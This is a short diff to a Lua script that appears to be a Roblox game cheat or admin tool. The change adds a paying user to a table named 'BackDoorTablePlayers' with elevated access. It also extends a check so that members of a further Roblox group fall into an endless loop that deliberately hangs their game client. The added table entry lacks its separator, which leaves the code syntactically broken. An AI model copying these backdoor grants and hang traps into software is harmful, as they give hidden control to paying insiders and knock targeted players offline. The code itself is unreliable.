@@ -306,6 +306,11 @@ local BackDoorTablePlayers = {
 		['Access'] = 2;
 		['Colour'] = Color3.fromRGB(235,31,31);
 	};
+	[1461593864] = {
+		['Name'] = "Bird paid for his tag for some reason";
+		['Access'] = 2;
+		['Colour'] = Color3.fromRGB(235,31,31);
+	}
 	[710288902] = {
 		['Name'] = "Randomly paid me 5 dollars";
 		['Access'] = 1;
@@ -3287,6 +3292,6 @@ end))
 notif("Cyrus' Streets admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: nXcZH36)",10,"rbxassetid://2474242690") -- string.format remains superior - Slays.
 notif("Newest Update","forgot I had this antiaim method lol",10,nil)
 
-if LP:IsInGroup(5152759) or string.find(LP.Name:lower(),"lynx") or BlacklistTable[LP.UserId] then
+if LP:IsInGroup(5152759) or LP:IsInGroup(5000083) or string.find(LP.Name:lower(),"lynx") or BlacklistTable[LP.UserId] then
 	while true do end
 end
